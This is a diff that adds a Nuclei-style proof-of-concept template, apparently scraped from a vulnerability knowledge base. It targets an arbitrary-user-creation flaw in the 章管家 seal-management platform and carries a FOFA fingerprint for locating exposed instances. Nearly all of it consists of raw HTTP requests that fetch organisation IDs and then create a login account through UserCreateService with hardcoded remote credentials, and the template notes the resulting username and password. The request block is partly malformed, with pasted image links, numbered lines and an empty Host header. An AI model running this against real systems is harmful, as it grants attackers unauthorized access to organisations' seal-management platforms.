@@ -1,0 +1,86 @@
+id: poc-xgbwttn28w4mmgik
+info:
+  name: 章管家UserCreateService存在任意用户添加漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xgbwttn28w4mmgik'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xgbwttn28w4mmgik
+    fofa: app="章管家-印章智慧管理平台"
+http:
+- raw:
+  - '1.获取orgId
+
+    POST /api/personSeal/QueryAllOrgIdsService HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Content-Type: application/json
+
+    Upgrade-Insecure-Requests: 1
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-User: ?1
+
+    Priority: u=0, i
+
+
+    {"bimRequestId":"1","bimRemotePwd":"123456","bimRemoteUser":"ZGJ","bimUid":"0","fullName":"123","orgId":"1","loginName":"123123","bimposition":"123"}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751640785184-a784974b-58da-4dfa-b4bf-15a2dc3c20aa.png)
+
+    2.通过上一步获取的orgId添加用户
+
+    1. POST /api/personSeal/UserCreateService HTTP/1.1
+
+    2. Host:
+
+    3. User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    4. Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    5. Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    6. Accept-Encoding: gzip, deflate, br, zstd
+
+    7. Content-Type: application/json
+
+    8. Upgrade-Insecure-Requests: 1
+
+    9. Sec-Fetch-Dest: document
+
+    10. Sec-Fetch-Mode: navigate
+
+    11. Sec-Fetch-Site: same-origin
+
+    12. Sec-Fetch-User: ?1
+
+    13. Priority: u=0, i
+
+    14.
+
+    15. {"bimRequestId":"1","bimRemotePwd":"123456","bimRemoteUser":"ZGJ","bimUid":"0","fullName":"123","orgId":"xx","loginName":"18111111111","bimposition":"123","__ENABLE__":"true"}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751640785487-6c98ba26-7eff-49b7-9208-b99f8860b102.png)
+
+    1. 用账号18111111111/666666成功登录系统'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
